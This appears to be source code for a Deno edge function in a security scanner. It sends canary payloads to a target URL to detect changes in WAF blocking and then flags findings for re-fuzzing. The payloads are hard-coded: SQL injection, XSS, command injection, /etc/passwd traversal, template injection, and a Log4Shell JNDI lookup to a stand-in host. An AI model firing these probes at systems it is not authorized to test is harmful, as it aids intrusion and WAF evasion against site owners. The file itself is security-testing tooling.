// Behavioral WAF drift detection via canary payloads.
// Fires a fixed set of mild canaries against the target root and records
// status / body-hash / blocked verdict. On subsequent runs, compares current
// vs baseline — any divergence = WAF rules changed → trigger re-fuzz.
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

function db() { return createClient(Deno.env.get("SUPABASE_URL")!, Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!); }

const CANARIES: Array<{ name: string; payload: string }> = [
  { name: "sqli_quote", payload: `?q=1'` },
  { name: "sqli_or", payload: `?q=1'+OR+'1'='1` },
  { name: "xss_tag", payload: `?q=<script>alert(1)</script>` },
  { name: "xss_svg", payload: `?q=<svg/onload=alert(1)>` },
  { name: "cmdi_semicolon", payload: `?q=;id` },
  { name: "traversal_dotdot", payload: `?q=../../../etc/passwd` },
  { name: "ssti_jinja", payload: `?q={{7*7}}` },
  { name: "log4shell", payload: `?q=\${jndi:ldap://x.com/a}` },
];

async function hashBody(s: string): Promise<string> {
  const buf = new TextEncoder().encode(s.slice(0, 4000));
  const h = await crypto.subtle.digest("SHA-256", buf);
  return [...new Uint8Array(h)].slice(0, 8).map(b => b.toString(16).padStart(2, "0")).join("");
}

function looksBlocked(status: number, body: string): boolean {
  if ([403, 406, 419, 429, 444, 503].includes(status)) return true;
  return /access denied|blocked by|cloudflare|incapsula|sucuri|aws.{0,5}waf|mod_security|forbidden/i.test(body.slice(0, 500));
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });
  try {
    const { targetId, baseUrl } = await req.json();
    if (!targetId || !baseUrl) return new Response(JSON.stringify({ error: "targetId + baseUrl required" }),
      { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } });

    const supa = db();
    const drifts: any[] = [];
    const upserts: any[] = [];

    for (const c of CANARIES) {
      let status = 0, body = "", blocked = false, hash = "";
      try {
        const r = await fetch(baseUrl + c.payload, {
          headers: { "User-Agent": "CyberScope-Canary/2.0" },
          redirect: "manual", signal: AbortSignal.timeout(6000),
        });
        status = r.status;
        body = await r.text();
        blocked = looksBlocked(status, body);
        hash = await hashBody(body);
      } catch { /* network err counts as drift signal */ status = -1; }

      const { data: prior } = await supa.from("canary_baselines")
        .select("*").eq("target_id", targetId).eq("canary_name", c.name).maybeSingle();

      let driftDetected = false;
      let driftReason = "";
      if (prior) {
        if (prior.baseline_blocked !== blocked) {
          driftDetected = true; driftReason = `blocked ${prior.baseline_blocked}→${blocked}`;
        } else if (prior.baseline_status !== status) {
          driftDetected = true; driftReason = `status ${prior.baseline_status}→${status}`;
        } else if (prior.baseline_body_hash && prior.baseline_body_hash !== hash &&
                   Math.abs((prior.baseline_body_length||0) - body.length) > 200) {
          driftDetected = true; driftReason = `body hash + length changed`;
        }
        if (driftDetected) drifts.push({ canary: c.name, reason: driftReason });

        await supa.from("canary_baselines").update({
          current_status: status, current_body_hash: hash, current_body_length: body.length,
          current_blocked: blocked, drift_detected: driftDetected, last_checked_at: new Date().toISOString(),
        }).eq("id", prior.id);
      } else {
        upserts.push({
          target_id: targetId, canary_name: c.name, payload: c.payload,
          baseline_status: status, baseline_body_hash: hash, baseline_body_length: body.length, baseline_blocked: blocked,
          current_status: status, current_body_hash: hash, current_body_length: body.length, current_blocked: blocked,
          last_checked_at: new Date().toISOString(),
        });
      }
      await new Promise(r => setTimeout(r, 100));
    }

    if (upserts.length) await supa.from("canary_baselines").insert(upserts);

    if (drifts.length > 0) {
      await supa.from("scan_logs").insert({
        target_id: targetId, log_type: "warning",
        message: `🛡️ Canary drift detected on ${drifts.length} payloads — WAF rules changed`,
        metadata: { drifts },
      });
      // Tag pending findings for re-mutation
      await supa.from("vulnerability_findings").update({ validation_status: "drift_remutation_pending" })
        .eq("target_id", targetId).eq("validation_status", "unverified");
    }

    return new Response(JSON.stringify({
      targetId, canariesTested: CANARIES.length, baselined: upserts.length, drifts,
    }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
  } catch (e) {
    return new Response(JSON.stringify({ error: e instanceof Error ? e.message : "err" }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } });
  }
});
